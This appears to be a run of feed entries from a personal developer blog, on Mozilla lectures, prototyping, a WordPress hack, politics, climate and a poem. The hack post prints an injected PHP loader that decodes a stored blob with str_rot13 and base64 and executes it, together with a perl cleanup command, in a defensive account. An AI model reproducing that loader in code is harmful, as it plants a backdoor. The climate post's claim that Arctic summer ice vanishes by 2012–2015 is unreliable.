  <content type="html">&lt;p&gt;In this week’s MoJo lectures, we listened to &lt;a href=&quot;http://commonspace.wordpress.com/&quot;&gt;Mark Surman&lt;/a&gt; and &lt;a href=&quot;http://www.wait-till-i.com/&quot;&gt;Chris Heilmann&lt;/a&gt; of Mozilla talk about the new HTML5 standards and capabilities in the Firefox browser, and from &lt;a href=&quot;http://ejohn.org/&quot;&gt;John Resig&lt;/a&gt; on how to build and maintain an open source product.&lt;/p&gt;

&lt;p&gt;The bridging concept between these two lectures is &lt;em&gt;adoption&lt;/em&gt;. It is the path from development to impact; the piece of the puzzle that enables a new tool or idea to enrich the lives of as many people as possible.&lt;/p&gt;

&lt;p&gt;In Chris’ whirlwind (and hilarious) tour of the new HTML5 universe, he described what motivated him to embrace web standards in the first place. Standards can be seen as a constraint on innovation, but in Chris’ world they &lt;em&gt;enable&lt;/em&gt; innovation, particularly at the client. Thanks to libraries like &lt;a href=&quot;http://modernizr.com&quot;&gt;Modernizr&lt;/a&gt;, the &lt;a href=&quot;http://www.whatwg.org/specs/web-apps/current-work/multipage/sections.html#the-section-element&quot;&gt;semantic&lt;/a&gt; &lt;a href=&quot;http://www.whatwg.org/specs/web-apps/current-work/multipage/sections.html#the-article-element&quot;&gt;richness&lt;/a&gt; of &lt;a href=&quot;http://diveintohtml5.com&quot;&gt;HTML5&lt;/a&gt;Â and the ever-expanding breadth of clients, we are now able to deliver pages that look and behave &lt;em&gt;differently&lt;/em&gt;Â in each client. Not in ways that break standards, but in ways that leverage them. For example, using phone keypads for numeric form inputs, or the address book for email inputs.&lt;/p&gt;

&lt;p&gt;Chris practices what he preaches. His easier &lt;a href=&quot;http://icant.co.uk/easy-youtube/&quot;&gt;YouTube interface for the learning disabled&lt;/a&gt;Â shows how web standards and API’s allow us to remix information and expand the audience for a piece of content. And, ultimately, expanding the audience for useful information seems to be Chris Heilmann’s core motivation, from his early days in radio to his current role as Developer Evangelist for Mozilla. Making things open and standards-based enables all of us to learn, and build on, how the web works.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://ejohn.org/&quot;&gt;John Resig&lt;/a&gt;Â is no stranger to how the web works. As the creator of &lt;a href=&quot;http://jquery.com&quot;&gt;JQuery&lt;/a&gt;Â and lead Javascript developer for online education pioneersÂ &lt;a href=&quot;http://www.khanacademy.org/&quot;&gt;Khan Academy&lt;/a&gt;, Resig knows how to build a community of support, whether for a software library or an actual library.&lt;/p&gt;

&lt;p&gt;For the uninitiated, JQuery is the web’s most popular Javascript library - and not by chance. Resig spent years of his spare time enhancing JQuery and helping customers make the most of it, mostly by himself.&lt;/p&gt;

&lt;p&gt;The success of JQuery, in the face of stiff competition from many other high-quality libraries like &lt;a href=&quot;http://mootools.net/&quot;&gt;MooTools&lt;/a&gt;, &lt;a href=&quot;http://www.prototypejs.org/&quot;&gt;Prototype&lt;/a&gt; and others, boils down to a few guiding principles (hint: they’re mostly non-technical):&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;Great API design and code quality&lt;/li&gt;
	&lt;li&gt;Extremely high quality documentation, FAQ, web site, tutorials&lt;/li&gt;
	&lt;li&gt;Be responsive to requests from community members in email, IRC, newsgroups, message boards, ticketing systems, and anywhere else that conversations about your product occur&lt;/li&gt;
	&lt;li&gt;Get the licensing right&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Treat every user as a potential future contributor&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The last part is key (which is why I’ve bolded it). Great open source projects live or die on the number of contributors working on the code - and nobody becomes a contributor to your project without first being a user. They will never make that leap without the knowledge that the leader of that project cares for them, so do everything you can to help people. You never know which ones will lead your project to widespread adoption.&lt;/p&gt;

  <content type="html">&lt;p&gt;This is the first in what will be a series of blog posts for the Mozilla-Knight Journalism Challenge. This week we heard from &lt;a href=&quot;http://www.azarask.in/blog/&quot; target=&quot;_blank&quot;&gt;Aza Raskin&lt;/a&gt;, former creative lead for Firefox and head of user experience for &lt;a href=&quot;http://mozilla.com&quot; target=&quot;_blank&quot;&gt;Mozilla&lt;/a&gt;, talking about the power of prototyping for understanding problems and building momentum behind your solution.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://picasaweb.google.com/goldsounds/UnlockingVideo?authkey=Gv1sRgCP690om2p67vsAE&amp;amp;pli=1#5615321524278144370&quot;&gt;&lt;img class=&quot;size-medium wp-image-522&quot; title=&quot;mockup&quot; src=&quot;http://www.danwalmsley.com/wp-content/uploads/2011/07/mockup-273x300.jpg&quot; alt=&quot;&quot; width=&quot;273&quot; height=&quot;300&quot; align=&quot;center&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As a programmer I often build &lt;a href=&quot;https://github.com/gravityrail&quot;&gt;throw-away apps&lt;/a&gt; in my spare time just to see how something works, explore a new API, or to discover new ways of solving old problems. However, in my professional life as a web developer, it’s easy to see building prototypes as a luxury. I’ve often had to fight for a budget that allows for scoping and prototyping, and even more often had to go without.&lt;/p&gt;

&lt;p&gt;Raskin’s presentation, “&lt;a href=&quot;http://www.azarask.in/blog/post/how-to-prototype-and-influence-people/&quot;&gt;How to Prototype and Influence People&lt;/a&gt;”, explores the advantages of prototyping in ways that I hadn’t previously recognised. These insights can be grouped into two main areas:&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;em&gt;1. Developing a better understanding of the problem&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Trying several ways to solve a problem leads to a better solution, but can also lead to the recognition of a deeper problem on which the solution is dependent. Raskin used the tale of &lt;a href=&quot;http://en.wikipedia.org/wiki/Paul_MacCready&quot;&gt;Paul MacReady&lt;/a&gt;’s winning of the &lt;a href=&quot;http://en.wikipedia.org/wiki/Kremer_prize&quot;&gt;Kremer Prize&lt;/a&gt;Â for long-distance human-powered flightÂ as an example of this; MacReady’s key insight was that by dramatically reducing the time to repair and modify his aircraft, he could arrive at a winning design in a matter of months instead of decades. He was right. Failing fast through prototypingÂ led to rapid learning, which led to rapid improvement.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;em&gt;2. Building support for your idea or product&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Many entrepreneurs toil for years on products that are technically interesting without ever testing the interface on a live end-user. To an end-user a product is not an idea, nor a technology. &lt;strong&gt;To your customers, the product &lt;em&gt;is &lt;/em&gt;the interface.&lt;/strong&gt;By encouraging end-users to experience some aspect of a product’s interface you can observe their reaction to it and learn how to communicate the benefits more effectively. Putting the prototype in the hands of end-users keeps you focused on solving real-world problems.&lt;/p&gt;

&lt;p&gt;As Aza put it:Â &lt;strong&gt;The value of an idea is zero unless it can be communicated&lt;/strong&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Aza’s approach to prototyping is fast and pragmatic. He encourages creating the first prototype in a day.Â You’re should be creating a “visual sketch”, a space people can move through with their ideas. This allows them to see the solution for themselves, which is always more convincing than being told how great an idea is, or being dictated to by an over-wrought solution. Palm’s &lt;a href=&quot;http://en.wikipedia.org/wiki/Jeff_Hawkins&quot;&gt;Jeff Hawkins&lt;/a&gt; first prototyped their hand-held devices using blocks of wood - as lo-fi as it gets.&lt;/p&gt;

&lt;p&gt;Aza began and ended the presentation with a quote from &lt;a href=&quot;http://en.wikipedia.org/wiki/Margaret_Mead&quot;&gt;Margaret Mead&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;Never doubt that a small group of committed people can change the world. Indeed, it's the only thing that ever has.&lt;/blockquote&gt;
&lt;p&gt;If you’re a small team looking to change the world, then &lt;a href=&quot;http://www.azarask.in/blog/post/how-to-prototype-and-influence-people/&quot;&gt;recognising the power&lt;/a&gt; of rapid prototyping could give your idea a big boost.&lt;/p&gt;

  <content type="html">&lt;p&gt;So I totally got hacked. Reminder: be vigilant about upgrading wordpress and its plugins, or bad things happen.&lt;/p&gt;

&lt;p&gt;The hack looks like this, and appears all over the place, at the top of some files and the bottom of others. It decodes a huge blob of encoded text that was stuffed into one of the wp-options values.&lt;/p&gt;
&lt;blockquote&gt;get_option(\&quot;_transient_feed_98e8dbd04edf43b096e815a29343b006\&quot;); $z=base64_decode(str_rot13($z)); if(strpos($z,\&quot;0FE00707\&quot;)!==false){ $_z=create_function(\&quot;\&quot;,$z); @$_z(); }&lt;/blockquote&gt;
&lt;p&gt;My first thought: “Oh crap, removing that text from hundreds of files? No thanks.”. Command line to the rescue! Thanks to Perl for still being awesome after all these years.&lt;/p&gt;
&lt;blockquote&gt;find . -name &quot;*.php&quot; -exec perl -e 's/^.*_transient_feed_98e8dbd04edf43b096e815a29343b006.*$//g' -p -i {} \;&lt;/blockquote&gt;
&lt;p&gt;If you’ve been struck by the same thing, just replace the _transient_feed with your own (the numbers probably change). These script-kiddy hackers are a perpetual annoyance. Hey kids - go build something awesome and useful instead of messing our web sites.&lt;/p&gt;

  <content type="html">&lt;p&gt;As told by Douglas Adams a few years ago. I laugh every time I read this, and today I shared it with my wife for the first time and so felt compelled to share it with you, too.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;This actually did happen to a real person, and the real person is me. I had gone to catch a train. This was April 1976, in Cambridge, U.K. I was a bit early for the train. Iâ€™d gotten the time of the train wrong. I went to get myself a newspaper to do the crossword, and a cup of coffee and a packet of cookies. I went and sat at a table. I want you to picture the scene. Itâ€™s very important that you get this very clear in your mind. Hereâ€™s the table, newspaper, cup of coffee, packet of cookies. Thereâ€™s a guy sitting opposite me, perfectly ordinary-looking guy wearing a business suit, carrying a briefcase. It didnâ€™t look like he was going to do anything weird. What he did was this: he suddenly leaned across, picked up the packet of cookies, tore it open, took one out, and ate it.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Now this, I have to say, is the sort of thing the British are very bad at dealing with. Thereâ€™s nothing in our background, upbringing, or education that teaches you how to deal with someone who in broad daylight has just stolen your cookies. You know what would happen if this had been South Central Los Angeles. There would have very quickly been gunfire, helicopters coming in, CNN, you knowâ€¦ But in the end, I did what any red-blooded Englishman would do: I ignored it. And I stared at the newspaper, took a sip of coffee, tried to do aclue in the newspaper, couldnâ€™t do anything, and thought, &lt;em&gt;What am I going to do?&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;In the end I thought &lt;em&gt;Nothing for it, Iâ€™ll just have to go for it&lt;/em&gt;, and I tried very hard not to notice the fact that the packet was already mysteriously opened. I took out a cookie for myself. I thought, &lt;em&gt;That settled him.&lt;/em&gt; But it hadnâ€™t because a moment or two later he did it again. He took another cookie. Having not mentioned it the first time, it was somehow even harder to raise the subject the second time around. â€œExcuse me, I couldnâ€™t help but noticeâ€¦â€ I mean, it doesnâ€™t really work.&lt;/p&gt;

&lt;p&gt;We went through the whole packet like this. When I say the whole packet, I mean there were only about eight cookies, but it felt like a lifetime. He took one, I took one, he took one, I took one. Finally, when we got to the end, he stood up and walked away. Well, we exchanged meaningful looks, then he walked away, and I breathed a sigh of relief and sat back.&lt;/p&gt;

&lt;p&gt;A moment or two later the train was coming in, so I tossed back the rest of my coffee, stood up, picked up the newspaper, and underneath the newspaper were my cookies. The thing I like particularly about this story is the sensation that somewhere in England there has been wandering around for the last quarter-century a perfectly ordinary guy whoâ€™s had the same exact story, only he doesnâ€™t have the punch line.&lt;/p&gt;

&lt;p&gt;-Douglas Adams, &lt;em&gt;The Salmon of Doubt&lt;/em&gt;
â€œCookiesâ€&lt;/p&gt;

  <content type="html">&lt;p&gt;Living in the US I hear a lot of heated rhetoric about taxes. While I’m not an economist, I do want to weigh in on what I see as a glaring logical flaw in how low taxes are supposed to benefit the little guy.&lt;/p&gt;

&lt;p&gt;Taxes paid to the government largely go to “safety net” services like pensions, unemployment benefits, basic health care, food stamps and so on. Such services, in sufficient quantity and quality, enable unemployed or disabled people to retain their dignity and health while they get back on their feet and back to work. (source:Â &lt;a href=&quot;http://en.wikipedia.org/wiki/File:Fy2010_spending_by_category.jpg&quot; target=&quot;_blank&quot;&gt;See pie chart here&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Very rich people are much less likely to need such services, and so for them paying taxes goes straight to something they don’t use and therefore don’t benefit from.&lt;/p&gt;

&lt;p&gt;Do tax cuts really benefit the rich?&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;&lt;a href=&quot;http://www.businessinsider.com/15-charts-about-wealth-and-inequality-in-america-2010-4#republican-tax-cuts-have-significantly-increased-the-wealth-gap-9&quot; target=&quot;_blank&quot;&gt;Huge leaps in inequality coinciding with tax cuts by Reagan and Bush Jr&lt;/a&gt; (note: Reagan also raised taxes, but in 1986 cut them)&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;http://www.businessinsider.com/15-charts-about-wealth-and-inequality-in-america-2010-4#the-last-two-decades-were-greatif-you-were-a-ceo-or-owner-not-if-you-were-anyone-else-5&quot; target=&quot;_blank&quot;&gt;Most of the benefits of economic growth going to the rich during the 90's &quot;boom&quot;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;But the rich in America, and in particular the super-rich, are a dwindling minority (while their total wealth balloons) (source: &lt;a href=&quot;http://www.businessinsider.com/15-charts-about-wealth-and-inequality-in-america-2010-4#the-gap-between-the-top-1-and-everyone-else-hasnt-been-this-bad-since-the-roaring-twenties-1&quot; target=&quot;_blank&quot;&gt;15 charts about wealth and poverty at Business Insider&lt;/a&gt;). Therefore in order to keep the system tilted in their favour they must convince a majority of voters to act in the interest of the wealthy elite, often against the poor’s own self-interest. They enact such influence on both Democrats and Republicans, but I can definitely detect a preference for Republicans, for whatever reason.&lt;/p&gt;

&lt;p&gt;This is why we are seeing this daft resurgence of “small government” and “Reaganomics” mantras from the Tea Party, when a more relevant question would be “what is the right size for the government to meet our needs, and what mix of services would it provide?”.&lt;/p&gt;

&lt;p&gt;This would be completely comprehensible (yet still not excusable), except that there’s a flaw the internal logic of these massive vested interests. As this siphoning of money and consolidation of power continues, the number of people who can afford to be at the top goes down. The social services that make life so easy for the rich crumble. You end up, in extreme cases, with scenes such as those scene across Africa and the Middle East this week (not that I’m suggesting the US is even close to that, but it’s an educational example nonetheless).&lt;/p&gt;

&lt;p&gt;So how can the US-based super-rich act in their own self-interest without screwing over everyone else and, eventually, even themselves?&lt;/p&gt;

&lt;p&gt;This brings me to a phenomenon I am going to call the “plumbing principle” (after actual plumbing, not Joe the Plumber). Basically the story goes like this: a version of the modern toilet was invented in England in the early 19th century because the aristocracy were so convinced that they were a fundamentally different breed of person from the lower classes that they started to pretend they didn’t even shit. In order to maintain this facade it was vitally important never to leave a room with a visible turd in it, be it in a pan, on the floor, on the nightstand or in the pocket of a silk smoking jacket.&lt;/p&gt;

&lt;p&gt;This led to the popularisation of the ceramic flush toilet amongst the very rich. Hallelujah! A room and device that made your lordship’s turd disappear faster than a donut at a me-right-now convention.&lt;/p&gt;

&lt;p&gt;But then something amazing happened. Doctors noticed a decrease in all sorts of diseases - naturally, as these people were exposed to far fewer microbes over a much shorter span of time.&lt;/p&gt;

&lt;p&gt;In 1848, with the Thames boiling with effluent and full chamber pots causing as many head injuries as cases of Cholera, the British Parliament passed the Public Health Act, mandating a toilet in every home and allocating 5 million pounds (a huge sum at the time) for the construction of underground sewers and treatment plants.&lt;/p&gt;

&lt;p&gt;In doing so, typhoid was practically eliminated overnight, and economic growth skyrocketed. The UK had achieved what so many civilisations had not - a functioning, multi-million person metropolis, with all the economic advantages and opportunities that created for both the nation and individuals.&lt;/p&gt;

&lt;p&gt;Obama talks about the “Sputnik Moment” as the driver of innovation and passion for the current century, but this implies a winner and loser - at least internationally. With the US economy creaking at the seams and the rhetoric from vested interests getting ever more divisive, perhaps it’s actually time for a “plumbing moment” - for the super-rich, the government, and concerned citizens to take a step back and think very seriously about how we can reap the rewards of mutual success rather than the winner-takes-all situation we find ourselves in today.&lt;/p&gt;

  <content type="html">&lt;p&gt;As part of its ongoing PR-ification of the financial crisis, Citigroup has posted the hilariously tautological “&lt;a href=&quot;http://new.citi.com/2010/02/a-safer-approach-to-risk.shtml&quot;&gt;A Safer Approach to Risk&lt;/a&gt;”.&lt;/p&gt;

&lt;p&gt;Here’s a quote from the article:&lt;/p&gt;
&lt;blockquote&gt;
For our society to function efficiently, capital needs to flow. But the attendant risk must be better managed. That's why we've strengthened our commitment to responsible finance.
&lt;/blockquote&gt;

&lt;p&gt;And here’s another notable quote from recent history:&lt;/p&gt;

&lt;blockquote&gt;
&quot;as long as the music is playing, you&amp;acirc;&amp;euro;&amp;trade;ve got to get up and dance. We&amp;acirc;&amp;euro;&amp;trade;re still dancing.&quot;
    -Citi Chief on Buyouts: &amp;acirc;&amp;euro;&amp;tilde;We&amp;acirc;&amp;euro;&amp;trade;re Still Dancing&amp;acirc;&amp;euro;&amp;trade;, DealBook, July 2007
&lt;/blockquote&gt;

&lt;p&gt;Exactly how much of that culture has actually changed? You can revamp how you do business, but it’s not just Citi that’s broken. It’s the entire culture and machinery of top-tier capitalism. They may be chagrined, but that is only temporary.&lt;/p&gt;

&lt;p&gt;Profit through obfuscation. Profit through leveraging the power that money provides. Profit through PR.&lt;/p&gt;

&lt;p&gt;Why not profit through generating value? How about that for a change? Sheesh. I’m sick of financial companies that treat business like a giant card trick.&lt;/p&gt;

&lt;p&gt;In other words, I remain to be convinced…&lt;/p&gt;

&lt;p&gt;I’m 6’6” / 200cm. You get the idea.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Happiness is an Exit Row&lt;/strong&gt;&lt;/p&gt;

With knees not shifting to and fro
With  aching not felt from below
Nor seat-backs crushing hips-to-toes
I do so love you Exit Row&lt;/p&gt;

&lt;p&gt;Happiness is an Exit Row
With room  to stage a puppet show
While dressed as Edgar Allen Poe
With &lt;span style=&quot;text-decoration: line-through;&quot;&gt;daughter&lt;/span&gt; &lt;span style=&quot;text-decoration: line-through;&quot;&gt;cousin&lt;/span&gt; wife in tow
Oh! How I love my Exit Row&lt;/p&gt;

&lt;p&gt;Happiness is an Exit Row
Should you steal it, you’re my foe
The  handle pulled, the door I’ll blow
Released your belt and out you go
I’d kill to have my Exit Row&lt;/p&gt;

  <content type="html">&lt;p&gt;Reprinted below is a response to a &lt;a href=&quot;http://online.wsj.com/article/SB10001424052748703499404574558070997168360.html#articleTabs%3Darticle&quot;&gt;“climategate” editorial&lt;/a&gt; published in the Wall Street Journal by Kimberly A. Strassel.&lt;/p&gt;

&lt;p&gt;In the article Strassel quotes Rep. Jim Inhofe’s claims that “Cap and Trade is dead”.&lt;/p&gt;

&lt;p&gt;With the CRU leak, many are holding Scientists to a ridiculous standard of behaviour that we wouldn’t even expect from Priests, Politicians or anyone else. Wow, you mean Scientists can be back-stabbing arseholes? Big surprise there! You mean they have pride, and occasionally massage results? Holy Obvious-Burgers Batman!&lt;/p&gt;

&lt;p&gt;Reader thoughts welcome, though I do recommend you read the original article for some context.&lt;/p&gt;

&lt;p&gt;Response continues…&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;It’s a real shame to see legislation on a globally important issue such as climate change treated with the same kind of partisan rhetoric as anything else.&lt;/p&gt;

&lt;p&gt;Despite your accusations that the leaked emails are “damaging”, not one scrap of evidence has been unveiled that indicates that the published data is wrong, that the models are incorrect, or indeed that the planet isn’t warming and that this warming is caused by humans.&lt;/p&gt;

&lt;p&gt;Human-caused climate change is real, and it is a genuine threat to continued prosperity and stability in the world. A few scientists blowing off steam or even hiding some results that they think don’t support their theories is nothing new. It does nothing to damage the credibility of the climate science field as a whole, unless journalists allow it to.cloud the issue.&lt;/p&gt;

&lt;p&gt;In over 900 papers published on the issue of climate change between 1993 and 2003, precisely none disagreed with the hypothesis that climate change is real and man made (cf. Oreskes, 2004). Such a consensus is practically unheard of in the history of scientific endeavour.&lt;/p&gt;

&lt;p&gt;Yet in the mainstream media, over the last 5 years, we have seen 53% of articles published raising some doubt over the existence and causes of this phenomenon.&lt;/p&gt;

&lt;p&gt;And while these scientific papers may disagree on the details, and individual scientists may let their egos and pride occasionally get in the way of professionalism, the same can be said for any industry. The overall trend is clear and unequivocal.&lt;/p&gt;

&lt;p&gt;Even as the arctic disappears before our eyes (it will be GONE in summer some time between 2012 and 2015 - the entire arctic ice shelf!), and we witness the greatest extinction the world has ever seen, and sea levels are rising faster than even the worst-case scenarios published a few years ago, these articles continue to appear and set back the movement to really do something about this problem.&lt;/p&gt;

&lt;p&gt;It is a shame that we may have to wait until it is too late before some people see fit to acknowledge the problem. Life is probably going to get quite uncomfortable, and your “economy” will not be able to save you when the planet no longer supports life the way it once did.&lt;/p&gt;

  <content type="html">&lt;p&gt;Today at the APEC summit, President Obama announced that top world leaders &lt;a href=&quot;http://www.nytimes.com/2009/11/15/world/asia/15prexy.html?ref=global-home&quot;&gt;would not form a binding, global agreement&lt;/a&gt; on CO2 emissions reduction at the Copenhagen Summit this December.&lt;/p&gt;

&lt;p&gt;They didn’t give any firm dates, beyond saying that such an agreement is not likely before the second half of 2010, which basically means 2011.&lt;/p&gt;

&lt;p&gt;This is both disappointing, and an opportunity.&lt;/p&gt;

&lt;p&gt;Disappointing because a binding agreement, even one that is a deep compromise, would at least establish momentum towards a low-carbon global economy.&lt;/p&gt;

&lt;p&gt;An opportunity because citizens worldwide have more chances to press for strong action at the time a decision is finally made.&lt;/p&gt;

&lt;p&gt;We should now shift our focus at Copenhagen, though not diminish our energy. The message is clear: the scientific community that has brought us so much progress and wealth over the last century are now telling us to drastically cut CO2 emissions or face terrible consequences. The community of the world overwhelmingly backs these conclusions and is ready to take action to switch to a new, sustainable way of living on the planet.&lt;/p&gt;

&lt;p&gt;As Mr Gore rightly says, the only thing missing is political will.&lt;/p&gt;
